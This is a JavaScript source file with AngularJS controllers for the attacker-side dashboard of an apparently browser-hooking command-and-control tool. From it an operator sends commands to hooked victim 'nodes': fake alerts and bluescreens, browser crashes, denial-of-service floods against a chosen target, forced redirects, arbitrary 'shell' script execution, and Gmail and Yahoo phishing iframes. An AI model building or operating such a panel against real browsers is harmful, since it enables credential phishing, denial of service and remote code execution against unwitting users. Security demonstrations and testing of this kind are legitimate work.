'use strict';

/* Controllers */

function DashboardCtrl($scope, $http, $timeout, Command, GLOBAL, Node) {
	hideTabs(apptabs,0);
	$scope.pollSpeed = 100;

	$scope.modal = GLOBAL.modal;

	$scope.setTarget = function(node){
		$scope.target = node;
	}

	$scope.isTarget = function(node){
		return $scope.target === node;
	}

	$scope.getAllNodes = function(){
		$http.get('/getallnodes').success(function(data){
			$scope.nodes = data.nodes;
			$scope.nodes.unshift({"name":"All Nodes","addr":"all","cid":"0"});
			// console.log(data.nodes);
			if(!$scope.target){
				$scope.target = $scope.nodes[0];
			}
		});
	}

	$scope.setPollSpeed = function(){
		if(isNumber($scope.pollSpeedText)){
			console.log($scope.pollSpeedText);
			$('#myModal').modal('hide');
			Command.add({target:$scope.target.cid,type:"pollspeed",command:$scope.pollSpeedText,ac:"yes"});
		}	
	}

	$scope.flush = function(){
		var cont = confirm("Are you sure you want to flush? This will remove all nodes and commands from the server. Nodes will have to reconnect. (Reconnection should be automatic if they're still on the same page.");
		if(cont){
			// client side
			$scope.nodes = [];
			$scope.target = null;
			// server side
			Node.flush();
		}
	}

	// The following are attacker side form submissions and preview methods
	// May be better do these in their own service

	$scope.sendAlert = function(){
		if($scope.alertText == undefined){
			return false;
		}
		else{
			Command.add({target:$scope.target.cid,type:"alert",command:$scope.alertText});
			$scope.alertText = '';
		}
	}

	$scope.alertPreview = function(){
		if($scope.alertText == undefined){
			return false;
		}
		else{
			alert($scope.alertText);
		}
	}


	$scope.sendAlert2 = function(){
		if($scope.alert2Text == undefined || $scope.alert2HeaderText == undefined){
			return false;
		}
		else{
			Command.add({target:$scope.target.cid,type:"alert2",command:[$scope.alert2HeaderText,$scope.alert2Text]});
			console.log("Header: " + $scope.alert2HeaderText);
			console.log("Message: " + $scope.alert2Text);
			$scope.alert2Text = '';
			$scope.alert2HeaderText = '';
		}
	}

	$scope.sendBlueScreen = function(){
		Command.add({target:$scope.target.cid,type:"bluescreen",command:"hahaha!"});
	}


	$scope.sendCrashBrowser = function(){
		Command.add({target:$scope.target.cid,type:"crash",command:"hahaha!",ac:"yes"});
	}

	$scope.sendDoS = function(){
		if(!$scope.dosform.$invalid){
			Command.add({target:$scope.target.cid,type:"dos",command:[$scope.dostargetText, $scope.dosrequestsText],ac:"yes"});
			$scope.dostargetText = '';
			$scope.dosrequestsText = '';
		}
	}

	$scope.sendRedirect = function(){
		if(!$scope.redirectform.$invalid){
			Command.add({target:$scope.target.cid,type:"redirect",command:[$scope.redirectText, $scope.redirectmethod],ac:"yes"});
			$scope.redirectText = '';
		}
	}

	$scope.sendShell = function(){
		if(!$scope.shellform.$invalid){ // should add jslint support here
			Command.add({target:$scope.target.cid,type:"shell",command:$scope.shellinputText});
			$scope.shellinputText = '';
		}
		
	}

	$scope.sendVideo = function(){
		var vidid = $scope.videoText;
		if(typeof vidid == 'undefined'){
			vidid = 'oHg5SJYRHA0';
		}
		Command.add({target:$scope.target.cid,type:"video",command:vidid});
		$scope.videoText = '';
	}


	// Effects

	$scope.sendEarthquake = function(){
		if(!$scope.earthquakeform.$invalid){
			Command.add({target:$scope.target.cid,type:"earthquake",command:[$scope.eqelementText, $scope.eqdurationText]});
			$scope.eqelementText = '';
			$scope.eqdurationText = 0;
		}
	}

	$scope.sendUpsidedown = function(){
		if(!$scope.upsidedownform.$invalid){
			Command.add({target:$scope.target.cid,type:"upsidedown",command:[$scope.udelementText, $scope.uddurationText]});
			$scope.udelementText = '';
			$scope.uddurationText = 0;
		}
	}


	// Phishing

	$scope.sendGooglePhish = function(method){
		Command.add({target:$scope.target.cid,type:"gmail",command:["iframe", method]});
	}

	$scope.sendYahooPhish = function(method){
		Command.add({target:$scope.target.cid,type:"yahoo",command:["iframe", method]});
	}



	$scope.getAllNodes();


}


function JobsCtrl($scope) {
	console.log("jobs");
	hideTabs(apptabs,1);


}

function ModuleInfoCtrl($scope) {
	hideTabs(apptabs,2);
}

function HelpCtrl($scope) {
	hideTabs(apptabs,3);
}

function SettingsCtrl($scope) {
	hideTabs(apptabs,4);
}



// UTILITY FUNCTIONS

var apptabs = $('#apptabs').find('li');

function hideTabs(list, activeTab){
	$(list).removeClass('active');
	$(list[activeTab]).addClass('active');
}

function isNumber(n) {
  return !isNaN(parseFloat(n)) && isFinite(n);
}